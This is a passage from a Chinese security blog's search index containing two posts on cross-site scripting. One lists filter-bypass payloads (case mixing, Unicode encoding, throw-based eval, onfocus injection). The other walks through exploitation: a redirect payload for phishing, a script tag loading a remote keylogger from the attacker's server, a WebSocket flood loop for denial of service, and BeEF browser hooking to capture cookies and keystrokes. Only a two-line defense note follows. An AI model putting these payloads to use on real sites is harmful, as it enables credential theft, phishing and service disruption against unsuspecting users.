          <category> 脚本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS bypass</title>
      <link href="/2019/12/02/XSS%20bypass/"/>
      <url>/2019/12/02/XSS%20bypass/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=27890306&auto=0&height=66"></iframe><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>&#8195;1.hex编码</p><p><img src="/images/xssbp.png" alt></p><p>&#8195;2.大小写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;  ————》 &lt;sCriPt&gt;AlERt(1)&lt;/sCriPt&gt;</span><br></pre></td></tr></table></figure><p>&#8195;3.空格回车Tab</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:alert(1)&quot; width=100&gt;</span><br></pre></td></tr></table></figure><p>&#8195;4.拆分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas</span><br><span class="line">cript:</span><br><span class="line">alert(1)&quot; width=100&gt;</span><br></pre></td></tr></table></figure><p>&#8195;5.Unicode编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert进行Unicode编码后\u0061\u006c\u0065\u0072\u0074</span><br><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;6.不使用括号</p><p>有的时候我们的（）会被过滤掉，那么我们就可以用throw来绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;  //这个在chrome里会出现一个uncaught错误，我们可以使用一下payload</span><br><span class="line">&lt;body/onload=javascript:window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&gt;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;7.不使用&lt;&gt;</p><p>当输入点在input便签里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value=&quot;XSStest&quot; type=text&gt;</span><br><span class="line">可以尝试</span><br><span class="line">&quot; autofocus onfocus=alert(1)//</span><br></pre></td></tr></table></figure><p>bypass的方式有很多，我就不一一列举了，可以尝试使用下面的payload去fuzz一下</p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p><a href="https://github.com/payloadbox/xss-payload-list" target="_blank" rel="noopener">https://github.com/payloadbox/xss-payload-list</a></p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS_利用</title>
      <link href="/2019/11/25/XSS_1/"/>
      <url>/2019/11/25/XSS_1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1300527847&auto=0&height=66"></iframe><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&#8195;简单的来说就是web应用对用户的输入过滤不足，导致攻击者插入恶意的脚本代码</p><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p><img src="/images/xsslc.jpg" alt></p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>&#8195;反射型</p><p>&#8195;&#8195;这种类型可以说是一次性的，需要用户去点击攻击者篡改后的链接，才会触发</p><p>&#8195;存储型</p><p>&#8195;&#8195;这种类型的话，恶意代码会被存储的网站数据库中，知道用户去访问就会触发</p><p>&#8195;DOM型</p><p>&#8195;&#8195;这是一种特殊类型的反射型xss，基于DOM文档对象模型的一种漏洞</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>&#8195;1.盗取cookie</p><p>&#8195;2.网页钓鱼</p><p>&#8195;&#8195;可使用setookit这个工具克隆网站，然后插入payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;windows.location=&quot;http://uip/&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;&#8195;当用户访问到存在漏洞的页面，就会跳转到你克隆的页面，输入的内容会在服务器上显示</p><p>&#8195;3.键盘记录</p><p>&#8195;&#8195;在咱们自己的服务器网站根目录下创建Keylogger.js文件</p><p><img src="/images/keylogger.png" alt="keylogger"></p><p>&#8195;&#8195;再创建keylogger.php文件，并保存在同一个目录下。</p><p><img src="/images/keyloggerphp.png" alt="keyloggerphp"></p><p>&#8195;&#8195;接着创建一个空的keylog.txt文件，并赋予其相应的可写权限。</p><p>&#8195;&#8195;在存在漏洞的网站插入payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://uip/Keylogger.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;4.DOS攻击</p><p>&#8195;如果你发现存储型的xss，并把这段恶意代码插入到目标网站，只要有用户访问到这个点，就会主动去请求连接要攻击的ip地址，站小流量小的话没啥危害，要是内种流量很大的网站，对目标ip会有很大的危害。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript”&gt;</span><br><span class="line"></span><br><span class="line">while (true)&#123; </span><br><span class="line"></span><br><span class="line">var ws = new WebSocket(&quot;ws://要攻击的IP地址:端口”);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>&#8195;5.利用beef软件进行攻击</p><p>&#8195;&#8195;首先我们开启beef，第一个标红处的代码需要你把他插入的目标网站，第二段标红处需要你自己访问</p><p><img src="/images/xssbeef.png" alt="xssbeef"></p><p>&#8195;当有人访问了存在xss的页面后，我们的beef就会显示出来</p><p><img src="/images/xssbeef1.png" alt="xssbeef"></p><p>&#8195;这个<code>logs</code>里记录的是用户鼠标键盘的一些操作：</p><p><img src="/images/xssbeef2.png" alt="xssbeef"></p><p>&#8195;这个<code>Current Browser ——&gt; Details</code> 里记录的是对方的操作系统、浏览器版本、cookie等信息</p><p><img src="/images/xssbeef3.png" alt="xssbeef"></p><p>&#8195;这个<code>Current Browser ——&gt; Commands</code>里是可以发送命令给主机，英文看不懂的自行翻译</p><p><img src="/images/xssbeef4.png" alt="xssbeef"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>&#8195;开启HttpOnly</p><p>&#8195;输入过滤 输出编码</p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
